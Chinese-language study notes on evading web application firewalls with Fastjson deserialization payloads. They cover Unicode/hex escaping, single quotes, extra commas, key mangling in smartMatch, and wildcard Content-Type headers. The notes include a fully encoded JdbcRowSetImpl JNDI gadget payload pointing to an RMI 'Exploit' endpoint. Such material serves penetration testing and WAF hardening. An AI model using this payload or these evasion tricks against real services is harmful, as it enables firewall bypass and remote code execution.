## bypass

### Unicode/Hex编码绕过

**可以结合tools/.py生成payload**

在`JSONLexerBase.scanSymbol`中对编码进行了处理

```java
case'u':
        char c1=this.next();
        char c2=this.next();
        char c3=this.next();
        char c4=this.next();
        int val=Integer.parseInt(new String(new char[]{c1,c2,c3,c4}),16);
        hash=31*hash+val;
        this.putChar((char)val);
        break;
case'x':
        char x1=this.ch=this.next();
        char x2=this.ch=this.next();
        int x_val=digits[x1]*16+digits[x2];
        char x_char=(char)x_val;
        hash=31*hash+x_char;
        this.putChar(x_char);

```

#### 单独`\u004c` Unicode

#### 单独`\x4c` Hex

#### 混合绕过

```java
{"\u0040\u0074\u0079\u0070\u0065":"\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"rmi://localhost:1099/Exploit","\x61\x75\x74\x6f\x43\x6f\x6d\x6d\x69\x74":true}
```

### 使用Feature词法分析器绕过

#### `Feature.AllowSingleQuotes`

决定parser是否允许单引号来包住属性名称和字符串值

那么可以**使用单引号替代双引号**，配合编码或者其他方式进行混淆绕过waf语义分析

```json
{
    'name':"aa"
}
```

#### `Feature.AllowArbitraryCommas`

`AllowArbitraryCommas`特性允许多重逗号。那么可以在多个属性之间引入多个`逗号,`，进行混淆

```json
{
    ,,,,,,,,"name":"a",,,,,,,,,,,,
}
```

#### `Feature.DisableFieldSmartMatch`智能匹配绕过

如果没有选择这个特性，即使JavaBean中的字段和JSON中的key并不完全匹配，在一定程度上还是可以正常解析的

- **使用`-`和`_`进行混淆**

  FastJSON会对JSON中没有成功映射JavaBean的key做智能匹配，在反序列的过程中会忽略大小写和下划线，自动会把下划线命名的Json字符串转化到驼峰式命名的Java对象字段中。
    查看**1.2.24版本**，部分关键部分代码如下，主要是在`JavaBeanDeserializer.smartMatch`方法：

  ```java
  if (fieldDeserializer == null)
      {
        snakeOrkebab = false;
        key2 = null;
        char ch;
        for (i = 0; i < key.length(); i++)
        {
          ch = key.charAt(i);
          if (ch == '_')
          {
            snakeOrkebab = true;
            key2 = key.replaceAll("_", "");
            break;
          }
          if (ch == '-')
          {
            snakeOrkebab = true;
            key2 = key.replaceAll("-", "");
            break;
          }
  }
  ```

  也就是说可以分别使用`-`和`_`来对payload进行混淆

  ```json
  {"n-a-m-e"}
  {"n_a_m_e"}
  ```

- **使用is开头的key字段**
  除此之外，Fastjson在做智能匹配时，如果key以`is`开头,则忽略`is`开头,相关代码如下:

  ```java
  int pos = Arrays.binarySearch(this.smartMatchHashArray, smartKeyHash);
  if ((pos < 0) && (key.startsWith("is")))
  {
  		smartKeyHash = TypeUtils.fnv1a_64_lower(key.substring(2));
  		pos = Arrays.binarySearch(this.smartMatchHashArray, smartKeyHash);
  }
  ```

### 修改 Content-Type

   Content-Type（MediaType），即是Internet Media Type，互联网媒体类型，也叫做MIME类型。在HTTP协议消息头中，使用Content-Type来表示请求和响应中的媒体类型信息。它用来告诉服务端如何处理请求的数据，以及告诉客户端（一般是浏览器）如何解析响应的数据，比如显示图片，解析并展示html等等。常见的有：

  - application/x-www-form-urlencoded：最常见POST提交数据的方式。
  - multipart/form-data：文件上传的数据提交方式。
  - application/xml：XML数据提交方式。
  - application/json：作为请求头告诉服务端消息主体是序列化的JSON字符串。

    某些Waf考虑到解析效率的问题，会根据`Content-Type`的内容进行针对性的拦截分析，例如值为`appliction/xml`时会进行XXE的检查，那么可以尝试将Content-Type设置为通配符“`*/*`来绕过相关的检查：

  

  同理对`application/json`Content-Type的请求，也可以尝试将Content-Type设置为通配符“`*/*`来绕过相关的检查：

  

## 参考

  [浅谈fastjson waf Bypass思路-SecIN (sec-in.com)](https://www.sec-in.com/article/950)